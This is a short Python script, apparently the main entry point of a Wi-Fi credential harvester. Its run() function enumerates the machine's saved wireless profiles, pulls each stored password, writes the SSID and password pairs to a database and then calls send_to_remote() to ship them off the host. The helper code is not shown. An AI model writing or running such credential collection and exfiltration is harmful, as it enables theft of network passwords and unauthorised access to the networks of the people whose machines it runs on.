from src.entities.wlan_class import Wlan
from src.services.wlan_scanner import WLANScanner
from src.repository.wlan_repository import WlanSqlManagement

ws = WLANScanner()

def run():
    ssid_list = ws.get_ssid_profiles_list()
    for wlan in ssid_list:
        pssw = ws.get_ssid_password(wlan)
        new_wlan = Wlan(ssid=wlan, password=pssw)    

        WlanSqlManagement(new_wlan).post_wlan()
        WlanSqlManagement(new_wlan).send_to_remote()
if __name__ == '__main__':
    run()